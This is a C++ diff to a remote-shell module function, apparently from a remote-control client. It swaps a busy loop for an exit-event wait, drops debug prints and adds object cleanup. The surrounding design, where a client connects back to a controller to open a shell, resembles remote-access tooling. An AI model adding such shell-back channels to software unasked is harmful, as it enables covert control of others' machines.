@@ -86,28 +86,29 @@ BOOL CModuleManage::OnReceiveConnectPacket(CPacket* pPacket) {
 
 DWORD WINAPI RunModuleShellRemote(CPacket* pPacket)
 {
-	
-	
-
 	CSocketClient* pChildSocketClient = new CSocketClient(pPacket->m_pSocketClient->m_pMainSocketClient);
-	//pChildSocketClient->StartSocketClient();
 	CModuleShellRemote* pModule = new CModuleShellRemote(pChildSocketClient);			// 在这里面给pChildSocketClient->m_pModule赋值
 
-
-	//g_pSocketClientManage->AddNewSocketClientToList(pChildSocketClient);			// 向SocketClient链表中添加新的socket连接
-
 	pChildSocketClient->StartSocketClient();
-	printf("CONNECT packet\n");
-	//printf("%d\n", pChildSocketClient->m_pTcpPackClient->IsConnected());
 	pChildSocketClient->SendPacket(SHELL_CONNECT, NULL, 0);
 
-	//pChildSocketClient->WaitForExitEvent();
-	while (true) {
-		//printf("%d\n", pChildSocketClient->m_pTcpPackClient->IsConnected());
+	pChildSocketClient->WaitForExitEvent();
+
+	//if (pPacket != nullptr) {
+	//	delete pPacket;
+	//	pPacket = nullptr;
+	//}
+
+	if (pChildSocketClient != nullptr) {
+		delete pChildSocketClient;
+		pChildSocketClient = nullptr;
 	}
 
-	delete pPacket;
-	pPacket = NULL;
+	if (pModule != nullptr) {
+		delete pModule;
+		pModule = nullptr;
+	}
+
 	printf("退出线程\n");
 	return 0;
 }
